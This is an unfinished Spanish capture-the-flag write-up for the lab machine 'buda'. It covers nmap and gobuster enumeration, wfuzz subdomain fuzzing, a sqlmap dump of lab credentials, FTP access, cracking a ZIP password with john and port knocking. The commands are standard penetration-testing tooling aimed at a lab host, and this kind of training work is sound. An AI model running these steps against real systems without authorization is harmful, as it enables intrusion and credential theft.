# Maquina boda

Write-up de la máquina **buda** de The HackersLab. IP: `192.168.100.162` — dominio: `budasec.thl` (entorno VirtualBox).

## 1. Reconocimiento

Escaneamos los puertos y servicios de la máquina con `nmap`:

```
nmap -sV -sC 192.168.100.162
```

![[Pasted image 20260927011812.png]]

La máquina expone dos servicios y resuelve como **budasec.thl** (`192.168.100.162`):

- **21/tcp** → vsftpd 3.0.5 (FTP).
- **80/tcp** → Apache httpd 2.4.52 (Ubuntu), con el título **Coming Soon Moring**.

El sistema operativo detectado es Unix y la MAC indica una VM de Oracle VirtualBox.

## 2. Enumeración web inicial

Enumeramos directorios sobre la IP con `gobuster` y el diccionario `common.txt`:

```
gobuster dir -u http://192.168.100.162 -w /usr/share/wordlists/dirb/common.txt
```

![[Pasted image 20260927012643.png]]

Entre los resultados destacan **index.html** y **robots.txt** (ambos con estado 200), además de varios archivos y el directorio `server-status`, que devuelven 403.

Al consultar el contenido del `robots.txt` encontramos una pista sobre el dominio real del sitio:

![[Pasted image 20260927013140.png]]

## 3. Configuración del hosts

Para trabajar con el dominio, agregamos una entrada en el archivo `/etc/hosts`:

```
nano /etc/hosts
```

![[Pasted image 20260927013333.png]]

Con `budasec.thl` apuntando a la máquina, volvemos a enumerar directorios, ahora contra el dominio:

```
gobuster dir -u http://budasec.thl/ -w /usr/share/wordlists/dirb/common.txt
```

![[Pasted image 20260927012529.png]]

## 4. Enumeración de subdominios

Buscamos subdominios con `wfuzz`, filtrando por el número de líneas de la respuesta (`--hl 363`) para descartar los falsos positivos:

```
wfuzz -c \
-w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
-H "Host: FUZZ.budasec.thl" \
--hl 363 \
http://budasec.thl/
```

![[Pasted image 20260926212313.png]]

De las 5000 peticiones solo una sobrevive al filtro: el subdominio **dev.budasec.thl**, que responde con un 200.

## 5. Inyección SQL en dev.budasec.thl

El subdominio `dev` expone un formulario que volcamos con `sqlmap`, forzando el uso de MySQL:

```
sqlmap -u "http://dev.budasec.thl/" --forms --dbms=mysql --dump
```

![[Pasted image 20260926214807.png]]

El volcado devuelve una tabla con usuarios, contraseñas en claro y sus hashes:

```
+----+-----------------+----------+--------------------------------------------------------------+
| id | password        | username | hashed_password                                               |
+----+-----------------+----------+--------------------------------------------------------------+
| 1  | ftpu@sr123p@@s! | ftpuser  | $2y$10$.gKHPvTvYkWfbRxtid10s.kgGWekExh9kx.Q/QMbaKQlH/ia6xx66 |
| 4  | admin123        | admin    | $2y$10$GgGK5MsjTbGrjqkTsLXCcOD0dui1zAXhTE72lDVB.c4igQQwHdP5a |
| 5  | password1       | user1    | $2y$10$6f8FfvozmWozwY3zeFvUCutLq4421U4RqTpXIfzITrrKG4KlnqWbm |
| 6  | password2       | user2    | $2y$10$UrcCrnPw7IdNp8minBpPC.HeXiQTlJ0dmVz0hWhqUfmcmRk6GdCg6 |
+----+-----------------+----------+--------------------------------------------------------------+
```

Las credenciales que nos interesan son las de FTP:

- usuario: **ftpuser**
- contraseña: **ftpu@sr123p@@s!**

## 6. Acceso al FTP

Con esas credenciales nos conectamos al servicio FTP de la máquina:

```
ftp ftpuser@192.168.100.162
```

![[Pasted image 20260927013008.png]]

El login con **ftpuser** / **ftpu@sr123p@@s!** es correcto (`230 Login successful`) y al listar el contenido nos encontramos con el archivo comprimido **documents.zip**, que descargamos. Al intentar descomprimirlo nos pide una contraseña que todavía no tenemos:

```
unzip documents.zip
```

![[Pasted image 20260927014916.png]]

## 7. Crackeo del ZIP

Para recuperar la contraseña extraemos el hash del ZIP con `zip2john` y lo atacamos con `john` y el diccionario `rockyou.txt`:

```
zip2john documents.zip > zip.hash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

![[Pasted image 20260926222436.png]]

`john` recupera la contraseña del fichero `audit2024` que hay dentro del ZIP: **manuelito**. Con ella descomprimimos el archivo:

```
unzip documents.zip
```

Contraseña introducida:

```
manuelito
```

## 8. Credenciales en audit2024

Al descomprimir aparece el fichero **audit2024**, que visualizamos con `cat`:

```
cat audit2024
```

![[Pasted image 20260927015600.png]]

Se trata de un informe de auditoría en el que, entre los riesgos identificados, aparecen expuestas las credenciales de la usuaria **yolanda**:

- usuario: **yolanda**
- contraseña: **y@lAnd361!**

## 9. Port knocking

A continuación realizamos un port knocking contra la máquina con la herramienta KnockIt, que tenemos en `/home/kali/knock`, para abrir el siguiente servicio:

```
python3 knock 192.168.100.162 9467
python3 knock 192.168.100.162 1739
python3 knock 192.168.100.162 8745
```

![[Pasted image 20260926231953.png]]

## 10. Siguiente paso

> Pendiente de documentar el resultado final.
